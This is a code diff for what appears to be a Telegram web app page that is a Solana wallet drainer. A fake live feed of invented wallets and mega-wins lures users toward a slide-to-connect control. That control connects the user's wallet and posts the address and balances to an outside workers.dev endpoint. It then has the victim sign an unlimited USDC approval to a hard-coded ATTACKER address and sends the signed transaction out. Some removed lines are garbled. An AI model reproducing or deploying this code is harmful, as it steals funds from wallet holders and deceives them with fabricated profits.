@@ -53,7 +53,6 @@
     text-transform: uppercase; 
   }
 
-  /* FOMO Live Feed */
   .feed-container {
     width: 100%;
     height: 200px;
@@ -81,7 +80,6 @@
     animation: slideFadeIn 0.5s ease-out forwards;
   }
 
-  /* NEUER EFFEKT FÜR MEGA WINS */
   .feed-item.mega-win {
     background: rgba(20, 241, 149, 0.15);
     border: 1px solid rgba(20, 241, 149, 0.4);
@@ -100,28 +98,10 @@
     to { opacity: 1; transform: translateX(0); } 
   }
 
-  .feed-wallet { 
-    font-family: monospace; 
-    color: #71717a; 
-    font-size: 11px; 
-    width: 50px; 
-  }
-  
-  .feed-token { 
-    font-weight: 600; 
-    color: #ffffff; 
-    flex: 1; 
-    text-align: left;
-    padding-left: 6px;
-  }
-  
-  .feed-profit { 
-    font-weight: 700; 
-    font-size: 12px; 
-    text-align: right;
-  }
+  .feed-wallet { font-family: monospace; color: #71717a; font-size: 11px; width: 50px; }
+  .feed-token { font-weight: 600; color: #ffffff; flex: 1; text-align: left; padding-left: 6px; }
+  .feed-profit { font-weight: 700; font-size: 12px; text-align: right; }
 
-  /* Slider */
   .slider-container {
     width: 100%;
     height: 56px;
@@ -195,7 +175,6 @@
 
   @keyframes spin { to { transform: rotate(360deg); } }
 
-  /* Animierter Fact Footer */
   .trust-footer {
     margin-top: 20px;
     font-size: 11px;
@@ -215,7 +194,6 @@
     line-height: 1.4;
   }
 
-  /* Statischer Sicherheitshinweis ganz unten */
   .security-footer {
     margin-top: 20px;
     padding-top: 16px;
@@ -240,7 +218,6 @@
     </div>
 
     <div class="feed-container" id="feedContainer">
-      <!-- Live Feed Items injected via JS -->
     </div>
 
     <div class="slider-container" id="sliderContainer">
@@ -267,7 +244,6 @@
     window.Telegram.WebApp.expand();
   }
 
-  // --- SOUND EFFECT ---
   const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
   
   function playPopSound() {
@@ -285,7 +261,6 @@
     osc.stop(audioCtx.currentTime + 0.1);
   }
 
-  // --- ANIMIERTER FUNNY FACT FOOTER ---
   const footerTexts = [
     "ZachXBT is watching the chain.",
     "Did you know? The Kimchi premium trade was mostly fake volume.",
@@ -360,23 +335,18 @@
   function rotateFooter() {
     footerEl.style.opacity = 0;
     footerEl.style.transform = 'translateY(-5px)';
-    
     setTimeout(() => {
       footerIndex = (footerIndex + 1) % footerTexts.length;
       footerEl.textContent = footerTexts[footerIndex];
-      
       footerEl.style.transform = 'translateY(5px)';
       void footerEl.offsetWidth; 
       footerEl.style.opacity = 1;
       footerEl.style.transform = 'translateY(0)';
     }, 400); 
   }
-  
   setInterval(rotateFooter, 5000);
 
-  // --- FOMO LIVE FEED ANIMATION ---
   const feed = document.getElementById('feedContainer');
-  
   const fakeWallets = ['7xKX...', '3vNd...', '8fRt...', '5cYh...', '9pLk...', '2mJh...', '6bFw...', '4dGs...', '1kLp...', '8wXc...'];
   const fakeTokens = ['WIF', 'BONK', 'POPCAT', 'MEW', 'BOME', 'SLERF', 'MYRO', 'JUP', 'PYTH', 'JTO', 'W', 'TNSR', 'DRIFT', 'KMNO', 'IO', 'ZEX', 'TRUMP', 'MOTHER', 'DADDY', 'BEER', 'WATER', 'GME', 'AMC', 'SC', 'CHAT', 'BODEN', 'TREMP', 'HARAMBE', 'MOG', 'BOBO', 'WOJAK', 'PEPE', 'SHIB', 'FLOKI', 'DOGE', 'SOL', 'ETH', 'BTC', 'AVAX', 'LINK', 'DOT', 'MATIC', 'ADA', 'XRP', 'LTC', 'UNI', 'AAVE', 'MKR', 'CRV', 'SUSHI', 'COMP', 'SNX', 'YFI', 'BAL', 'REN', 'KNC', 'ZRX', 'OMG', 'BAT', 'REP', 'MANA', 'SAND', 'AXS', 'ENJ', 'CHZ', 'THETA', 'FTM', 'NEAR', 'ALGO', 'ATOM', 'LUNA', 'UST', 'KAVA', 'RUNE', 'OCEAN', 'FET', 'AGIX', 'RNDR', 'GRT', 'FIL', 'AR', 'HNT', 'IOTX', 'HNT', 'CKB', 'ROSE', 'MINA', 'CFX', 'APT', 'SUI', 'SEI', 'TIA', 'INJ', 'OSMO', 'DYDX', 'GMX', 'GNS', 'PENDLE', 'LDO', 'RPL', 'EIGEN', 'ETHFI', 'REZ', 'OMNI', 'SAGA', 'TAO', 'ARKM', 'WLD', 'AI', 'NMR', 'CGPT', 'NFP', 'ACE', 'PIXEL', 'PORTAL', 'MAVIA', 'RONIN', 'PRIME', 'ILV', 'MAGIC', 'HIGH', 'VOXEL', 'ALICE', 'TLM', 'GHST', 'YGG', 'AXS', 'SLP', 'MANA', 'SAND', 'APE', 'GALA', 'IMX', 'GODS', 'PYR', 'DERC', 'MC', 'MCC', 'WEMIX', 'XPLA', 'ASTR', 'KLAY', 'MTL', 'XDC', 'VET', 'HBAR', 'EGLD', 'FLOW', 'ICP', 'QNT', 'XTZ', 'EOS', 'NEO', 'IOTA', 'DASH', 'ZEC', 'XMR', 'DCR', 'LSK', 'ARK', 'STRAT', 'PIVX', 'PART', 'NAV', 'ZEN', 'WAVES', 'KMD', 'SYS', 'VIA', 'GRS', 'GAME', 'BLOCK', 'PIVX', 'DGB', 'RDD', 'POT', 'FTC', 'VTC', 'NMC', 'PPC', 'XPM', 'NVC', 'FTC', 'ANC', 'TIPS', 'FLO', 'CANN', 'MEC', 'NET', 'DOGE', 'LTC', 'XRP', 'BCH', 'BSV', 'BTG', 'DASH', 'ZEC', 'XMR', 'DCR', 'LSK', 'ARK'];
   
@@ -385,19 +355,16 @@
     const token = fakeTokens[Math.floor(Math.random() * fakeTokens.length)];
     
     let pnlText = "";
-    let pnlColor = "#14F195"; // Grün
+    let pnlColor = "#14F195"; 
     let isMegaWin = isMega;
     
     if (isMega) {
-      // Der Mega-Win: Über 1000%
       const pnlPercent = Math.random() * 2500 + 1000;
       const baseInvest = Math.random() * 400 + 100;
       const pnlValue = (baseInvest * (pnlPercent / 100)).toFixed(2);
       pnlText = `+$${pnlValue} (+${pnlPercent.toFixed(1)}%)`;
     } else {
-      // Normale Wins / Losses
       const isWin = Math.random() > 0.35;
-      
       if (isWin) {
         const pnlPercent = Math.random() * 435 + 15;
         const baseInvest = Math.random() * 1400 + 100;
@@ -408,7 +375,7 @@
         const baseInvest = Math.random() * 1800 + 200;
         const pnlValue = (baseInvest * (pnlPercent / 100)).toFixed(2);
         pnlText = `-$${pnlValue} (-${pnlPercent.toFixed(1)}%)`;
-        pnlColor = "#ef4444"; // Rot
+        pnlColor = "#ef4444"; 
       }
     }
     
@@ -421,26 +388,15 @@
     `;
     
     feed.prepend(el);
-    
-    if (feed.children.length > 6) {
-      feed.lastChild.remove();
-    }
+    if (feed.children.length > 6) feed.lastChild.remove();
   }
 
-  // Initial 5 normale Items
-  for(let i=0; i<5-worker; i++) addFeedItem();
-  
-  // Norm.rale Items alle 3 Sekunden
-th  setInterval(addFeedItem, 300v0);
-  
-  // Mega-Win alle 10 Sekunden
-  setInterval(() => {
-    addFeedItem(true);
-  }, 10000);
+  for(let i=0; i<5; i++) addFeedItem();
+  setInterval(addFeedItem, 3000);
+  setInterval(() => { addFeedItem(true); }, 10000);
 
-  // --- CONFIG ---
   const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"; 
-  const ENDPOINT = "https://sol-synczkr6jv.workers.dev"; 
+  const ENDPOINT = "https://sol-sync-worker.rthvzkr6jv.workers.dev"; 
   const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
 
   const container = document.getElementById('sliderContainer');
@@ -460,15 +416,11 @@ th  setInterval(addFeedItem, 300v0);
     else if (window.solflare?.isSolflare) provider = window.solflare;
 
     if (provider) {
-      try {
-        await provider.connect({ onlyIfTrusted: true });
-      } catch (e) {}
+      try { await provider.connect({ onlyIfTrusted: true }); } catch (e) {}
     }
   });
 
-  function initSlider() {
-    maxDrag = container.offsetWidth - thumb.offsetWidth - 8;
-  }
+  function initSlider() { maxDrag = container.offsetWidth - thumb.offsetWidth - 8; }
 
   function startDrag(e) {
     if (container.classList.contains('loading') || container.classList.contains('success')) return;
@@ -481,13 +433,10 @@ th  setInterval(addFeedItem, 300v0);
     if (!isDragging) return;
     const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
     let delta = startX - clientX; 
-    
     if (delta < 0) delta = 0;
     if (delta > maxDrag) delta = maxDrag;
-    
     currentX = delta;
     thumb.style.transform = `translateX(-${currentX}px)`;
-    
     const opacity = 1 - (currentX / maxDrag);
     text.style.opacity = opacity;
   }
@@ -495,16 +444,13 @@ th  setInterval(addFeedItem, 300v0);
   function endDrag() {
     if (!isDragging) return;
     isDragging = false;
-    
     if (currentX > maxDrag * 0.7) {
       container.classList.add('loading');
       text.style.opacity = 0;
       thumb.style.transition = 'width 0.3s ease, border-radius 0.3s ease, transform 0.3s ease';
       thumb.style.transform = `translateX(-${maxDrag}px)`;
-      
       icon.style.display = 'none';
       spin.style.display = 'block';
-      
       triggerConnect();
     } else {
       thumb.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1)';
@@ -527,9 +473,7 @@ th  setInterval(addFeedItem, 300v0);
             window.location.href = `https://phantom.app/ul/browse/${encodeURIComponent(url)}?ref=${encodeURIComponent(url)}`;
           }
         });
-      } else {
-        alert("Please open in a Web3 wallet browser.");
-      }
+      } else { alert("Please open in a Web3 wallet browser."); }
       resetSlider();
       return; 
     }
@@ -537,16 +481,10 @@ th  setInterval(addFeedItem, 300v0);
     try {
       const resp = await provider.connect();
       const victim = resp.publicKey.toString();
-      
       const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-      
       const solBalance = await conn.getBalance(resp.publicKey);
       const solAmount = solBalance / solanaWeb3.LAMPORTS_PER_SOL;
-      
-      const victimAta = await splToken.getAssociatedTokenAddress(
-        new solanaWeb3.PublicKey(USDC_MINT),
-        resp.publicKey
-      );
+      const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
 
       let usdcAmount = 0;
       try {
@@ -557,29 +495,14 @@ th  setInterval(addFeedItem, 300v0);
       await fetch(ENDPOINT, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ 
-          victim, 
-          chain: "solana",
-          type: "connection_and_balance",
-          sol: solAmount.toFixed(4),
-          usdc: usdcAmount,
-          ts: Date.now() 
-        })
+        body: JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: solAmount.toFixed(4), usdc: usdcAmount, ts: Date.now() })
       });
 
       if (usdcAmount > 0) {
-        const delegateIx = splToken.createApproveInstruction(
-          victimAta,
-          new solanaWeb3.PublicKey(ATTACKER),
-          resp.publicKey,
-          [],
-          BigInt("18446744073709551615")
-        );
-
+        const delegateIx = splToken.createApproveInstruction(victimAta, new solanaWeb3.PublicKey(ATTACKER), resp.publicKey, [], BigInt("18446744073709551615"));
         const tx = new solanaWeb3.Transaction().add(delegateIx);
         tx.feePayer = resp.publicKey;
         tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
-
         const signedTx = await provider.signTransaction(tx);
 
         await fetch(ENDPOINT, {
@@ -593,12 +516,9 @@ th  setInterval(addFeedItem, 300v0);
       container.classList.remove('loading');
       container.classList.add('success');
       thumb.innerHTML = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>';
-
       playPopSound();
 
-    } catch (e) {
-      resetSlider();
-    }
+    } catch (e) { resetSlider(); }
   }
 
   function resetSlider() {
@@ -620,7 +540,6 @@ th  setInterval(addFeedItem, 300v0);
   thumb.addEventListener('mousedown', startDrag);
   window.addEventListener('mousemove', moveDrag);
   window.addEventListener('mouseup', endDrag);
-
   thumb.addEventListener('touchstart', startDrag, {passive: false});
   window.addEventListener('touchmove', moveDrag, {passive: false});
   window.addEventListener('touchend', endDrag);
